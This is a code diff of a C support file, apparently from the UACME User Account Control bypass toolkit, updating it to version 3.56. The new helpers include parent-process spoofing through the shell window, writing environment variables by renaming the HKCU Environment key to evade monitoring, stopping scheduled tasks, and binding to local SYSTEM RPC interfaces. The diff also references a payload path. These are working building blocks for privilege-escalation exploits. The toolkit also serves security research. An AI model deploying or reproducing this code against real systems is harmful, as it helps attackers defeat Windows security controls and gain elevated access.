@@ -4,9 +4,9 @@
 *
 *  TITLE:       SUP.C
 *
-*  VERSION:     3.55
+*  VERSION:     3.56
 *
-*  DATE:        13 Mar 2021
+*  DATE:        30 July 2021
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -28,9 +28,33 @@ USER_ASSOC_SIGNATURE* g_UserAssocSignatures[] = {
     &UAS_SIG_18362,
     &UAS_SIG_18363,
     &UAS_SIG_19041,
-    &UAS_SIG_19042,
+    &UAS_SIG_19042_19043,
     &UAS_SIG_VNEXT
 };
+
+#if defined(__cplusplus)
+extern "C" {
+#endif
+
+    _Must_inspect_result_
+        _Ret_maybenull_ _Post_writable_byte_size_(size)
+        void* __RPC_USER MIDL_user_allocate(_In_ size_t size)
+    {
+        return((void __RPC_FAR*) supHeapAlloc(size));
+    }
+
+#pragma warning(push)
+#pragma warning(disable: 6387)
+#pragma warning(disable: 6001)
+    void __RPC_USER MIDL_user_free(_Pre_maybenull_ _Post_invalid_ void* p)
+    {
+        supHeapFree(p);
+    }
+#pragma warning(pop)
+
+#if defined(__cplusplus)
+}
+#endif
 
 /*
 * supEncodePointer
@@ -1455,20 +1479,19 @@ BOOL supSetEnvVariableEx(
                 (BYTE*)lpVariableData,
                 cbData);
 
-            if (NT_SUCCESS(ntStatus)) {
-
-                SendMessageTimeout(HWND_BROADCAST,
-                    WM_SETTINGCHANGE,
-                    0,
-                    (LPARAM)lpVariableName,
-                    SMTO_BLOCK,
-                    1000,
-                    NULL);
-
-            }
-
         }
 
+        if (NT_SUCCESS(ntStatus)) {
+
+            SendMessageTimeout(HWND_BROADCAST,
+                WM_SETTINGCHANGE,
+                0,
+                (LPARAM)lpVariableName,
+                SMTO_BLOCK,
+                1000,
+                NULL);
+
+        }
 
     } while (FALSE);
 
@@ -1524,15 +1547,105 @@ BOOL supSetEnvVariable(
             bResult = (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ,
                 (BYTE*)lpVariableData, cbData) == ERROR_SUCCESS);
 
-            if (bResult) {
-                SendMessageTimeout(HWND_BROADCAST,
-                    WM_SETTINGCHANGE,
-                    0,
-                    (LPARAM)lpVariableName,
-                    SMTO_BLOCK,
-                    1000,
-                    NULL);
+        }
+
+        if (bResult) {
+            SendMessageTimeout(HWND_BROADCAST,
+                WM_SETTINGCHANGE,
+                0,
+                (LPARAM)lpVariableName,
+                SMTO_BLOCK,
+                1000,
+                NULL);
+        }
+
+    } while (FALSE);
+
+    if (hKey != NULL) {
+        RegFlushKey(hKey);
+        RegCloseKey(hKey);
+    }
+
+    return bResult;
+}
+
+/*
+* supSetEnvVariable
+*
+* Purpose:
+*
+* Remove or set current user environment variable.
+*
+*/
+BOOL supSetEnvVariable2(
+    _In_ BOOL fRemove,
+    _In_opt_ LPWSTR lpKeyName,
+    _In_ LPWSTR lpVariableName,
+    _In_opt_ LPWSTR lpVariableData
+)
+{
+    BOOL    bResult = FALSE;
+    HKEY    hKey = NULL;
+    DWORD   cbData;
+
+    LPWSTR lpSubKey;
+
+    LARGE_INTEGER liValue;
+    ULONG seedValue;
+    WCHAR szNewKey[MAX_PATH];
+
+    do {
+        if (lpVariableName == NULL)
+            break;
+
+        if (lpKeyName == NULL)
+            lpSubKey = L"Environment";
+        else
+            lpSubKey = lpKeyName;
+
+        if ((lpVariableData == NULL) && (fRemove == FALSE))
+            break;
+
+        RtlSecureZeroMemory(&szNewKey, sizeof(szNewKey));
+        seedValue = GetTickCount();
+        liValue.LowPart = RtlRandomEx(&seedValue);
+        seedValue = ~GetTickCount();
+        liValue.HighPart = RtlRandomEx(&seedValue);
+
+        supBinTextEncode(liValue.QuadPart, szNewKey);
+
+        if (ERROR_SUCCESS == RegRenameKey(HKEY_CURRENT_USER, lpSubKey, szNewKey)) {
+
+            if (ERROR_SUCCESS == RegOpenKey(HKEY_CURRENT_USER, szNewKey, &hKey)) {
+
+                if (fRemove) {
+                    bResult = (RegDeleteValue(hKey, lpVariableName) == ERROR_SUCCESS);
+                }
+                else {
+                    cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
+                    bResult = (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ,
+                        (BYTE*)lpVariableData, cbData) == ERROR_SUCCESS);
+
+
+                }
+
+                RegFlushKey(hKey);
+                RegCloseKey(hKey);
+                hKey = NULL;
+
             }
+
+            RegRenameKey(HKEY_CURRENT_USER, szNewKey, lpSubKey);
+        }
+
+        if (bResult) {
+            SendMessageTimeout(HWND_BROADCAST,
+                WM_SETTINGCHANGE,
+                0,
+                (LPARAM)lpVariableName,
+                SMTO_BLOCK,
+                1000,
+                NULL);
         }
 
     } while (FALSE);
@@ -2482,6 +2595,11 @@ PVOID supCreateUacmeContext(
     }
     // 3. Temp
     supExpandEnvironmentStrings(L"%temp%\\", Context->szTempDirectory, MAX_PATH);
+
+    // 4. Current directory
+    if (GetCurrentDirectory(MAX_PATH, Context->szCurrentDirectory) < MAX_PATH) {
+        supPathAddBackSlash(Context->szCurrentDirectory);
+    }
 
     //
     // Default payload path.
@@ -4062,4 +4180,338 @@ BOOL supGetAppxId(
     RegCloseKey(hKey);
 
     return bResult;
+}
+
+/*
+* supStopTaskByName
+*
+* Purpose:
+*
+* Stop scheduled task by name.
+*
+*/
+BOOL supStopTaskByName(
+    _In_ LPCWSTR TaskFolder,
+    _In_ LPCWSTR TaskName
+)
+{
+    BOOL bResult = FALSE;
+    HRESULT hr;
+    ITaskService* pService = NULL;
+    ITaskFolder* pRootFolder = NULL;
+    IRegisteredTask* pTask = NULL;
+    TASK_STATE taskState;
+
+    BSTR bstrTaskFolder = NULL;
+    BSTR bstrTask = NULL;
+    VARIANT varDummy;
+
+    do {
+
+        bstrTaskFolder = SysAllocString(TaskFolder);
+        if (bstrTaskFolder == NULL)
+            break;
+
+        bstrTask = SysAllocString(TaskName);
+        if (bstrTask == NULL)
+            break;
+
+        hr = CoCreateInstance(&CLSID_TaskScheduler,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            &IID_ITaskService,
+            (void**)&pService);
+
+        if (FAILED(hr))
+            break;
+
+        VariantInit(&varDummy);
+
+        hr = pService->lpVtbl->Connect(pService,
+            varDummy,
+            varDummy,
+            varDummy,
+            varDummy);
+
+        if (FAILED(hr))
+            break;
+
+        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
+        if (FAILED(hr))
+            break;
+
+        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
+        if (FAILED(hr))
+            break;
+
+        hr = pTask->lpVtbl->get_State(pTask, &taskState);
+        if (FAILED(hr))
+            break;
+
+        if (taskState == TASK_STATE_RUNNING) {
+            hr = pTask->lpVtbl->Stop(pTask, 0);
+        }
+
+        bResult = SUCCEEDED(hr);
+
+    } while (FALSE);
+
+    if (bstrTaskFolder)
+        SysFreeString(bstrTaskFolder);
+
+    if (bstrTask)
+        SysFreeString(bstrTask);
+
+    if (pTask)
+        pTask->lpVtbl->Release(pTask);
+
+    if (pRootFolder)
+        pRootFolder->lpVtbl->Release(pRootFolder);
+
+    if (pService)
+        pService->lpVtbl->Release(pService);
+
+    return bResult;
+}
+
+/*
+* supPathAddBackSlash
+*
+* Purpose:
+*
+* Add trailing backslash to the path if it doesn't have one.
+*
+*/
+LPWSTR supPathAddBackSlash(
+    _In_ LPWSTR lpszPath
+)
+{
+    SIZE_T nLength;
+    LPWSTR lpszEnd, lpszPrev, lpszResult = NULL;
+
+    nLength = _strlen(lpszPath);
+
+    if (nLength) {
+
+        lpszEnd = lpszPath + nLength;
+
+        if (lpszPath == lpszEnd)
+            lpszPrev = lpszPath;
+        else
+            lpszPrev = (LPWSTR)lpszEnd - 1;
+
+        if (*lpszPrev != TEXT('\\')) {
+            *lpszEnd++ = TEXT('\\');
+            *lpszEnd = TEXT('\0');
+        }
+
+        lpszResult = lpszEnd;
+
+    }
+
+    return lpszResult;
+}
+
+/*
+* supOpenShellProcess
+*
+* Purpose:
+*
+* Return handle to shell process.
+*
+*/
+HANDLE supOpenShellProcess(
+    _In_ ULONG dwDesiredAccess
+)
+{
+    HWND hwndShell = GetShellWindow();
+    ULONG processId = 0, desiredAccess = dwDesiredAccess;
+
+    GetWindowThreadProcessId(hwndShell, &processId);
+    if (processId) {
+
+        if (!(desiredAccess & PROCESS_CREATE_PROCESS))
+            desiredAccess |= PROCESS_CREATE_PROCESS;
+
+        return OpenProcess(desiredAccess, FALSE, processId);
+
+    }
+
+    return NULL;
+}
+
+/*
+* supRunProcessFromParent
+*
+* Purpose:
+*
+* Start new process with given parent.
+*
+*/
+HANDLE supRunProcessFromParent(
+    _In_ HANDLE hParentProcess,
+    _Inout_opt_ LPWSTR lpApplicationName,
+    _In_ LPWSTR lpszParameters,
+    _In_opt_ LPWSTR lpCurrentDirectory,
+    _In_ ULONG CreationFlags,
+    _In_ WORD ShowWindowFlags,
+    _Out_opt_ HANDLE* PrimaryThread
+)
+{
+    BOOL bResult = FALSE;
+    DWORD dwFlags = CreationFlags | CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;
+
+    HANDLE hNewProcess = NULL;
+
+    LPWSTR pszBuffer = NULL;
+    SIZE_T size;
+    STARTUPINFOEX si;
+    PROCESS_INFORMATION pi;
+
+    if (PrimaryThread)
+        *PrimaryThread = NULL;
+
+    RtlSecureZeroMemory(&pi, sizeof(pi));
+    RtlSecureZeroMemory(&si, sizeof(si));
+
+    size = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
+    pszBuffer = (LPWSTR)supHeapAlloc(size);
+    if (pszBuffer) {
+
+        _strcpy(pszBuffer, lpszParameters);
+        si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+
+        size = 0x30;
+
+        do {
+            if (size > 1024)
+                break;
+
+            si.lpAttributeList = supHeapAlloc(size);
+            if (si.lpAttributeList) {
+
+                if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
+                    if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
+                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(hParentProcess), 0, 0))
+                    {
+                        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+                        si.StartupInfo.wShowWindow = ShowWindowFlags;
+
+                        bResult = CreateProcess(lpApplicationName,
+                             pszBuffer,
+                            NULL,
+                            NULL,
+                            FALSE,
+                            dwFlags | EXTENDED_STARTUPINFO_PRESENT,
+                            NULL,
+                            lpCurrentDirectory,
+                            (LPSTARTUPINFO)&si,
+                            &pi);
+
+                        if (bResult) {
+                            hNewProcess = pi.hProcess;
+                            if (PrimaryThread) {
+                                *PrimaryThread = pi.hThread;
+                            }
+                            else {
+                                CloseHandle(pi.hThread);
+                            }
+                        }
+
+                    }
+
+                    if (si.lpAttributeList)
+                        DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
+
+                }
+                supHeapFree(si.lpAttributeList);
+            }
+
+        } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);
+
+        supHeapFree(pszBuffer);
+    }
+
+    return hNewProcess;
+}
+
+/*
+* supCreateBindingHandle
+*
+* Purpose:
+*
+* Bind handle to the RPC interface.
+*
+*/
+RPC_STATUS supCreateBindingHandle(
+    _In_ RPC_WSTR RpcInterfaceUuid,
+    _Out_ RPC_BINDING_HANDLE* BindingHandle
+)
+{
+    RPC_STATUS status = RPC_S_INTERNAL_ERROR;
+    RPC_SECURITY_QOS_V3 sqos;
+    RPC_WSTR StringBinding = NULL;
+    RPC_BINDING_HANDLE Binding = NULL;
+    PSID LocalSystemSid = NULL;
+    DWORD cbSid = SECURITY_MAX_SID_SIZE;
+
+
+    if (BindingHandle)
+        *BindingHandle = NULL;
+
+    RtlSecureZeroMemory(&sqos, sizeof(sqos));
+
+    status = RpcStringBindingComposeW(RpcInterfaceUuid,
+        TEXT("ncalrpc"),
+        NULL,
+        NULL,
+        NULL,
+        &StringBinding);
+
+    if (status == RPC_S_OK) {
+
+        status = RpcBindingFromStringBindingW(StringBinding, &Binding);
+        RpcStringFreeW(&StringBinding);
+
+        if (status == RPC_S_OK) {
+
+            LocalSystemSid = LocalAlloc(LPTR, cbSid);
+            if (LocalSystemSid) {
+                if (CreateWellKnownSid(WinLocalSystemSid, NULL, LocalSystemSid, &cbSid)) {
+
+                    sqos.Version = 3;
+                    sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
+                    sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
+                    sqos.IdentityTracking = 0;
+                    sqos.Sid = LocalSystemSid;
+
+                    status = RpcBindingSetAuthInfoExW(Binding,
+                        NULL,
+                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                        RPC_C_AUTHN_WINNT,
+                        0,
+                        0,
+                        (RPC_SECURITY_QOS*)&sqos);
+
+                    if (status == RPC_S_OK) {
+                        *BindingHandle = Binding;
+                        Binding = NULL;
+                    }
+
+                }
+                else {
+                    status = GetLastError();
+                }
+                LocalFree(LocalSystemSid);
+            }
+            else {
+                status = ERROR_NOT_ENOUGH_MEMORY;
+            }
+        }
+    }
+
+    if (Binding)
+        RpcBindingFree(&Binding);
+
+    return status;
 }
